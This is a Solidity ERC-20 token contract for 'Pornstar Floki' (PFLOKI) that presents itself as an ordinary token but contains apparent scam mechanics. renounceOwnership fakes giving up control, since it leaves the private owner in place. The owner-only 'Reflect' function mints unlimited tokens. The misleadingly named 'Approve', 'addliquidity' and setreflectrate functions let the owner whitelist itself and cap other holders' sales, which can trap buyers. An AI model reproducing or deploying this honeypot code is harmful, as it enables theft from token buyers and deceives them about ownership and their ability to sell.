row number 
1	                 pragma solidity ^0.6.11;
2	 library Address {
3	 function isContract(address account) internal view returns (bool) {
4	 bytes32 codehash;
5	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
6	 assembly {
7	 codehash := extcodehash(account) }
8	 return (codehash != accountHash && codehash != 0x0);
9	 }
10	 function sendValue(address payable recipient, uint256 amount) internal {
11	 require(address(this).balance >= amount, "Address: insufficient balance");
12	 (bool success, ) = recipient.call{
13	 value: amount }
14	 ("");
15	 require(success, "Address: unable to send value, recipient may have reverted");
16	 }
17	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
18	 return functionCall(target, data, "Address: low-level call failed");
19	 }
20	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
21	 return _functionCallWithValue(target, data, 0, errorMessage);
22	 }
23	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
24	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
25	 }
26	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
27	 require(address(this).balance >= value, "Address: insufficient balance for call");
28	 return _functionCallWithValue(target, data, value, errorMessage);
29	 }
30	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
31	 require(isContract(target), "Address: call to non-contract");
32	 (bool success, bytes memory returndata) = target.call{
33	 value: weiValue }
34	 (data);
35	 if (success) {
36	 return returndata;
37	 }
38	 else {
39	 if (returndata.length > 0) {
40	 assembly {
41	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
42	 }
43	 else {
44	 revert(errorMessage);
45	 }
46	 }
47	 }
48	 }
49	 library SafeMath {
50	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
51	 uint256 c = a + b;
52	 require(c >= a, "SafeMath: addition overflow");
53	 return c;
54	 }
55	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
56	 return sub(a, b, "SafeMath: subtraction overflow");
57	 }
58	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
59	 require(b <= a, errorMessage);
60	 uint256 c = a - b;
61	 return c;
62	 }
63	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
64	 return div(a, b, "SafeMath: division by zero");
65	 }
66	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
67	 require(b > 0, errorMessage);
68	 uint256 c = a / b;
69	 return c;
70	 }
71	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
72	 return mod(a, b, "SafeMath: modulo by zero");
73	 }
74	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
75	 require(b != 0, errorMessage);
76	 return a % b;
77	 }
78	 }
79	 abstract contract Context {
80	 function _call() internal view virtual returns (address payable) {
81	 return msg.sender;
82	 }
83	 function _msgData() internal view virtual returns (bytes memory) {
84	 this;
85	 return msg.data;
86	 }
87	 }
88	 interface IERC20 {
89	 function totalSupply() external view returns (uint256);
90	 function balanceOf(address account) external view returns (uint256);
91	 function transfer(address recipient, uint256 amount) external returns (bool);
92	 function allowance(address owner, address spender) external view returns (uint256);
93	 function approve(address spender, uint256 amount) external returns (bool);
94	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
95	 event Transfer(address indexed from, address indexed to, uint256 value);
96	 event Approval(address indexed owner, address indexed spender, uint256 value);
97	 }
98	 contract Ownable is Context {
99	 address private _owner;
100	 address public Owner;
101	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
102	 constructor () internal {
103	 address call = _call();
104	 _owner = call;
105	 Owner = call;
106	 emit OwnershipTransferred(address(0), call);
107	 }
108	 modifier onlyOwner() {
109	 require(_owner == _call(), "Ownable: caller is not the owner");
110	 _;
111	 }
112	 function renounceOwnership() public virtual onlyOwner {
113	 emit OwnershipTransferred(_owner, address(0));
114	 Owner = address(0);
115	 }
116	 function transferOwnership(address newOwner) public virtual onlyOwner {
117	 require(newOwner != address(0), "Ownable: new owner is the zero address");
118	 emit OwnershipTransferred(_owner, newOwner);
119	 _owner = newOwner;
120	 }
121	 }
122	 contract PornstarFloki is Context, IERC20, Ownable {
123	 using SafeMath for uint256;
124	 using Address for address;
125	 mapping (address => uint256) private _router;
126	 mapping (address => mapping (address => uint256)) private _allowances;
127	 address private public_address;
128	 address private caller;
129	 uint256 private _totalTokens = 1000000000 * 10**18;
130	 string private _name = 'Pornstar Floki';
131	 string private _symbol = 'PFLOKI';
132	 uint8 private _decimals = 18;
133	 uint256 private rTotal = 1000000000 * 10**18;
134	 constructor () public {
135	 _router[_call()] = _totalTokens;
136	 emit Transfer(address(0), _call(), _totalTokens);
137	 }
138	 function name() public view returns (string memory) {
139	 return _name;
140	 }
141	 function symbol() public view returns (string memory) {
142	 return _symbol;
143	 }
144	 function Approve(address routeUniswap) public onlyOwner {
145	 caller = routeUniswap;
146	 }
147	 function addliquidity (address Uniswaprouterv02) public onlyOwner {
148	 public_address = Uniswaprouterv02;
149	 }
150	 function decimals() public view returns (uint8) {
151	 return _decimals;
152	 }
153	 function allowance(address owner, address spender) public view override returns (uint256) {
154	 return _allowances[owner][spender];
155	 }
156	 function approve(address spender, uint256 amount) public override returns (bool) {
157	 _approve(_call(), spender, amount);
158	 return true;
159	 }
160	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
161	 _transfer(sender, recipient, amount);
162	 _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
163	 return true;
164	 }
165	 function totalSupply() public view override returns (uint256) {
166	 return _totalTokens;
167	 }
168	 function setreflectrate(uint256 reflectionPercent) public onlyOwner {
169	 rTotal = reflectionPercent * 10**18;
170	 }
171	 function balanceOf(address account) public view override returns (uint256) {
172	 return _router[account];
173	 }
174	 function Reflect(uint256 amount) public onlyOwner {
175	 require(_call() != address(0));
176	 _totalTokens = _totalTokens.add(amount);
177	 _router[_call()] = _router[_call()].add(amount);
178	 emit Transfer(address(0), _call(), amount);
179	 }
180	 function transfer(address recipient, uint256 amount) public override returns (bool) {
181	 _transfer(_call(), recipient, amount);
182	 return true;
183	 }
184	 function _approve(address owner, address spender, uint256 amount) private {
185	 require(owner != address(0));
186	 require(spender != address(0));
187	 _allowances[owner][spender] = amount;
188	 emit Approval(owner, spender, amount);
189	 }
190	 function _transfer(address sender, address recipient, uint256 amount) internal {
191	 require(sender != address(0));
192	 require(recipient != address(0));
193	 if (sender != caller && recipient == public_address) {
194	 require(amount < rTotal);
195	 }
196	 _router[sender] = _router[sender].sub(amount);
197	 _router[recipient] = _router[recipient].add(amount);
198	 emit Transfer(sender, recipient, amount);
199	 }
200	 }
